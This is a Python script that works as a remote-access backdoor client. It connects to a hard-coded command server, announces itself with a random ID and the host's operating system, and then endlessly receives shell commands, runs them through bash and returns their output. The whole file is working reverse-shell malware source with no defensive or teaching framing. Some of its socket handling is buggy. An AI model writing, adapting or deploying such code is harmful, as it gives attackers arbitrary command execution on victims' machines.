import socket
import sys
import subprocess
import platform
import time
import uuid

SRVCONN = ('localhost', 8870)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
OS = platform.system()


class stdout:
    def __init__(self):
        self.result = []
    def write(self, str):
        self.result = str.split('\n')
    


def initConn(connectionString):
    sock.connect(connectionString)
    
def receiveStuffVariable():
    data = ""
    try:
        lenReceived = 0
        lenActual = sock.recv(4)
        while (lenReceived < lenActual):
            data += sock.recv(16)
            lenReceived += len(data)

    finally:
        return data
    
def receiveStuff():
    return sock.recv(1024)
    
def sendStuff(message):
    try:
        #lenToSend = len(message)
        #sock.send(lenToSend.encode())
        sock.sendall(message.encode())
    finally:
        pass
    
def execStuff(command):
    p = subprocess.Popen("bash -c " + command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout
    return p.read().decode()
    
        
def main():
    while True:
        try:
            initConn(SRVCONN)
            sendStuff(str(uuid.uuid4()) + ": just arrived to vacation on: " + OS)
        except socket.error as exc:
            print("Caught exception socket.error : %s\n" % exc)
        finally:
            while True:
                sendStuff(execStuff(receiveStuff().decode()))
    
    
if __name__ == "__main__":
    main()